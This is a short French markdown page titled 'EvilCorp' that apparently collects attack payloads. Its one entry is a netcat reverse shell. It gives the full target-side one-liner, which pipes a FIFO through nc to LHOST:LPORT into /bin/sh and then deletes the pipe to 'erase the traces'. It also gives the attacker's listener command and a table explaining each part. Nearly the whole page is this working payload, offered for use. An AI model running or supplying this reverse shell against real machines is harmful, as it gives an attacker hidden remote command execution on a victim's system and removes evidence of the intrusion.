# EvilCorp

## Payloads

### Simple Netcat playload : Reverse shell
Payload en utilisant Netcat (nc) comme reverse shell.  


Commandes :  
`man mkfifo ... mkfifo - make FIFOs (named pipes)`  
`man nohup  ... nohup  - run a command immune to hangups, with output to a non-tty`  

Machine cible : 
```bash
nohup mkfifo /tmp/hago; nc LHOST LPORT 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago
```

Machine serveur `LHOST:LPORT` :
```bash
nc -lnvp LPORT
```


| Commande | Explication  |  
|----------|--------------|
|`nc LHOST LPORT 0</tmp/hago      `   | Crée un client qui envoie ce qui est recu sur le pipe `hago` |
|`nc ... \| /bin/sh >/tmp/hago    `  | Exécute avec l'interpréteur bash ce que recoit le client nc et écrit le résultat dans le pipe | 
|`2>&1`                         | Redirige la sortie erreur(2) sur l'affichage standard(1) qui est envoyer par nc au serveur. `2>&1` plutôt que `2>1`. Le second redirigie la sortie erreur dans un fichier nommé '1' | 
|`rm /tmp/hago`                 | On termine en effaçant les traces du payload |


Résumé :    
Le serveur envoie des commandes exécutées par le client et recois le résultat et les erreurs.



